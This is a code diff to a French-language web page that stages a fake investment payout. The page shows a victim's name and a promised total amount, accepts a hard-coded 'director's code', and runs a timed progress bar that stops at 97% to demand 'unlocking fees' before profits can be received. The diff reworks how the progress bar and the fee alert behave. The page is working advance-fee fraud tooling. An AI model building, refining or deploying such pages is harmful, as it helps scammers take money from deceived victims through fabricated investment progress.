@@ -113,6 +113,7 @@
     </style>
 </head>
 <body>
+   
     <div id="investor-info" class="interface"></div>
     <div class="background-image"></div>
     <div class="interface">   
@@ -147,43 +148,6 @@
             <div class="transfer-text">Montant total à recevoir : ${totalAmount}</div>
         `;
 
-        const progressBar = document.querySelector('.progress');
-        const progressPercent = document.querySelector('.progress-percent');
-        let percent = localStorage.getItem('progress') ? parseInt(localStorage.getItem('progress')) : 0;
-        let interval;
-
-        function updateProgressBar() {
-            progressBar.style.width = percent + '%';
-            progressPercent.textContent = percent + '%';
-        }
-
-        function progress() {
-            if (percent < 100) {
-                percent++;
-                localStorage.setItem('progress', percent);
-                updateProgressBar();
-
-                if (percent == 97) {
-                    localStorage.setItem('alertShown', true);
-                    showAlertMessage();
-                }
-            } else {
-                clearInterval(interval);
-            }
-        }
-
-        function showAlertMessage() {
-            const alertMessage = `Alert : Mr/Mme ${investorName}, veuillez payer les frais de déblocage afin de valider votre transaction et recevoir immédiatement vos bénéfices dans les 15 minutes.`;
-            const dialog = document.createElement('dialog');
-            dialog.innerHTML = `<p>${alertMessage}</p><button>OK</button>`;
-            document.body.appendChild(dialog);
-            dialog.querySelector('button').addEventListener('click', () => {
-                dialog.close();
-                dialog.remove();
-            });
-            dialog.showModal();
-        }
-
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
             if (code2 == "2120") {
@@ -191,27 +155,32 @@
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
                 document.querySelector('#btn-receive').style.display = 'inline-block';
-                localStorage.setItem('investmentStarted', true);
             } else {
                 alert("Code incorrect");
             }
         });
 
         document.querySelector('#btn-receive').addEventListener('click', () => {
-            showAlertMessage();
+            alert('Veuillez payer les frais demandés');
         });
 
-        if (localStorage.getItem('investmentStarted')) {
-            interval = setInterval(progress, 15500);
-            document.querySelector('#invest').innerText = "En cours d'investissement...";
-            document.querySelector('#btn-deblock').style.display = 'none';
-            document.querySelector('#btn-receive').style.display = 'inline-block';
-        }
+        const progressBar = document.querySelector('.progress');
+        const progressPercent = document.querySelector('.progress-percent');
+        let percent = 0;
+        let interval;
 
-        updateProgressBar();
+        function progress() {
+            if (percent <= 99) {
+                progressBar.style.width = percent + '%';
+                progressPercent.textContent = percent + '%';
+                percent++;
+            } else {
+                clearInterval(interval);
+            }
 
-        if (localStorage.getItem('alertShown') && percent >= 97) {
-            showAlertMessage();
+            if (percent == 97) {
+                document.querySelector('#alert-msg').innerText = 'Alert : Mr/Mme ' + investorName + ' Veuillez payer les frais de déblocage afin de valider votre transaction et recevoir immédiatement vos bénéfices dans les 15 minutes.';
+            }
         }
     </script>
 </body>
